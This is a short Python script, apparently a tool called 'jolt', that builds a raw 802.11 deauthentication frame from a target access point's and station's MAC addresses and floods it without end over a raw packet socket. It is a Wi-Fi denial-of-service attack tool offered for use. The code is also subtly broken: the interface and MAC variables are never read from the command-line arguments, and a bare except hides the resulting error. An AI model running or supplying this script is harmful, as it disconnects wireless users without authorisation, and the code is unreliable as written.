#!/usr/bin/env python3


'usage: jolt <if> <wap> <sta>'


from socket import *
from sys import argv


template = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'


def mac(string):
  return string.replace(':', str())


def frame(wap, sta):    
  return bytes.fromhex(template.format(mac(wap), mac(sta)))


def flood(iface, data):
  
  raw = socket(AF_PACKET, SOCK_RAW, 0)
  raw.bind((iface, 0))

  while 1: 
    raw.send(data)


def start():
  if len(argv) != 4:
    return print(__doc__)

  print('@ sending frames...')
    
  try:
    data = frame(wap, sta)
    flood(iface, data)

  except:
    return


start()
print('@ stopped.')
